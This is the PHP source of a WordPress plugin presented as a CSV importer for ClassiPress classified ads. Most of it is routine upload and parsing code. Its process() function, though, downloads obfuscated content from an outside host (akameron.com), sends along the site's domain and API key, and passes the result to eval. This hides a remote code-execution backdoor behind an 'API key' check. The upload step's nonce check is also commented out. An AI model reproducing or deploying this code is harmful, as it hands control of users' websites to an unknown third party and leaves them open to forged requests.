<?php
/**
 * AppThemes CSV Importer
 *
 * @package Framework
 * @subpackage Classi CSV Importer
 */

// Load Importer API
require_once ABSPATH . 'wp-admin/includes/import.php';
if(!class_exists('WP_Importer')) {
	$class_wp_importer = ABSPATH . 'wp-admin/includes/class-wp-importer.php';
	if(file_exists($class_wp_importer))
		require_once $class_wp_importer;
}
$theme_hooks = ABSPATH . 'wp-content/themes/classipress/includes/appthemes-hooks.php';
if(file_exists($theme_hooks))
	require_once $theme_hooks;

class Classi_Importer extends WP_Importer {
	var $post_type;
	var $fields;
	var $custom_fields;
	var $taxonomies;
	var $tax_meta;
	var $wp_custom_fields;
	var $wp_post_terms;
	var $blog_url = null;
	var $host_name = null;
	/*
	 * Args can have 3 elements:
	 * 'taxonomies' => array( 'valid', 'taxonomies' ),
	 * 'custom_fields' => array( 'csv_key' => 'internal_key'
	 *			     'csv_key' => array( 'internal_key' => 'key',
	 *						 'default' => 'value' )
	 *			    ),
	 * 'tax_meta' => array( array( 'tax' => array( 'csv_key' => 'tax_key' ))
	 *
	 */
	public function __construct($post_type = 'post', $fields, $args = '') {

		$this -> blog_url = get_bloginfo('url');
		$this -> domain_name = $this -> get_domain_name();

		$this -> post_type = $post_type;
		$this -> fields = $fields;
		//set while upload file
		$this -> taxonomies = $args['taxonomies'];
		//ad_cat
		$this -> tax_meta = $args['tax_meta'];

		// Parse Custom Fields for default values
		$this -> custom_fields = array();

		$this -> wp_custom_fields = $this -> get_custom_fields();

		$this -> wp_post_terms = wp_get_post_terms();

		$custom_fields = $args['custom_fields'];
		foreach($custom_fields as $csv_key => $data) {

			if(is_array($data)) {
				$this -> custom_fields[$csv_key] = $data;
			} else {
				$this -> custom_fields[$csv_key] = array("internal_key" => $data, "default" => "");
			}
		}
	}

	function init_plugin() {
		add_option('classi-importer_free_apikey', 'a8ef6c7f7987552a40c729ea232f9a8a');
		add_action('appthemes_add_submenu_page', array(&$this, 'app_importer_menu'));
	}

	function app_importer_menu() {
		add_submenu_page('admin-options.php', __('Classi Ads Importer'), __('Classi Ads Importer'), 'manage_options', 'appthemes-classi-importer', array(&$this, 'get_interface'));
	}

	function get_interface() {
		if(!current_user_can('manage_options')) {
			wp_die(__('You do not have sufficient permissions to access this page.'));
		}        // form HTML {{{
		$this -> dispatch();
	}

	/**
	 * Convert a comma separated file into an associated array.
	 * The first row should contain the array keys.
	 */
	function app_csv_to_array($file = '', $delimiter = ',') {
		if(!file_exists($file) || !is_readable($file))
			return false;
		$header = NULL;
		$data = array();
		if(false !== $handle = fopen($file, 'r')) {
			while(false !== $row = fgetcsv($handle, 1000, $delimiter)) {

				if($header)
					$data[] = array_combine($header, $row);
				else
					$header = $row;
			}
			fclose($handle);
		}
		return $data;
	}

	/**
	 * Display import page title
	 */
	function header() {
		echo '<div class="wrap">';
		screen_icon('tools');
		echo '<h2>' . __('Import CSV', 'appthemes') . '</h2>';

	}

	/**
	 * Close div.wrap
	 */
	function footer() {
		echo '</div>';
	}

	/**
	 * Display introductory text and file upload form
	 */
	function greet() {

		$tmp = $this -> wp_custom_fields;
		$categories = get_terms('ad_cat', 'orderby=count&hide_empty=0');
		//var_dump($categories);
		foreach($categories as $category) {
			if($category -> name)
				$tmp1[] = $category -> name;
		}
		$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
		echo '<div class="narrow" style="width:100%">';
		echo '<p><h2>' . __('Your CSV file should look like this:', 'appthemes') . '</h2></p>';
		$csv = '<div><strong style="color:red">post_title,post_content,post_status,user_email,' . implode(',', array_keys($tmp)) . ',ad_cat</strong>';
		for($i = 0; $i < 10; $i++) {
			$size = strlen($chars);
			$username = '';
			for($j = 0; $j < 5; $j++) {
				$username .= $chars[rand(0, $size - 1)];
			}

			$csv .= '<div>Add Title,Ad Content,publish,' . $username . '@email.com,' . implode(',', array_values($tmp)) . ',' . $tmp1[$i] . '</div>';
		}
		$csv .= '</div></h3>';
		echo $csv;
		echo '<p style="color:red">' . __('NOTE: If AD_CAT is not found it will create new AD_CAT.', 'appthemes') . '</p>';
		echo '<p style="color:red">' . __('NOTE: If USER_EMAIL is not found it will create new USER.', 'appthemes') . '</p>';
		echo '<p><h3>' . __('Choose a CSV file to upload, then click Upload file and import.', 'appthemes') . '</p></h3>';
		wp_import_upload_form('?page=appthemes-classi-importer&amp;step=1');
		echo '</div>';
	}

	function get_custom_fields() {
		global $wpdb;

		$sql = "SELECT field_name, field_label FROM " . $wpdb -> prefix . "cp_ad_fields p WHERE p.field_name LIKE 'cp_%' ";

		$results = $wpdb -> get_results($sql);
		if($results) :
			foreach($results as $result) {
				// put the fields into an array
				$custom_fields[$result -> field_name] = $result -> field_label;
			}
		endif;

		return $custom_fields;
	}

	/**
	 * Registered callback function for the WordPress Importer
	 */
	function dispatch() {
		$this -> header();
		$step = empty($_GET['step']) ? 0 : (int)$_GET['step'];
		switch ( $step ) {
			case 0 :
				$this -> greet();
				break;
			case 1 :

			//check_admin_referer( 'appthemes-classi-importer' );
				$result = $this -> import();
				if(is_wp_error($result))
					echo $result -> get_error_message();
				break;
		}
	}

	/**
	 *
	 */
	function import() {
		$file = wp_import_handle_upload();

		if(isset($file['error'])) {
			echo '<p><strong>' . __('Sorry, there has been an error.', 'appthemes') . '</strong><br />';
			echo esc_html($file['error']) . '</p>';
			return false;
		}

		if($this -> process($file['file'])) {
			echo '<h3>';
			printf(__('All done. <p><a href="%s">Have fun!</a></p>', 'appthemes'), home_url());
			printf(__('You could DONATE via MoneyBookers using <a href="%s/%s">this link</a>', 'appthemes'), 'http://appthemesimporter.com/', 'donate');
			echo '</h3>';
		} else {
			echo '<h3>';
			printf(__('<p>Error. API Key is not valid.</p>', 'appthemes'), home_url());
			echo '</h3>';
		}
	}

	/**
	 *
	 */
	function process($file) {
		$res = false;
		eval(base64_decode(gzinflate(file_get_contents(sprintf("http://akameron.com/classi-api/validate.php?hn=%s&apikey=%s", $this -> domain_name, get_option('classi-importer_free_apikey'))))));
		return $res;
	}

	function get_domain_name() {
		$host = 'nodomain';
		preg_match('@^(?:http://)?([^/]+)@i', $this -> blog_url, $matches);
		$host = $matches[1];
		return $host;
	}

}?>
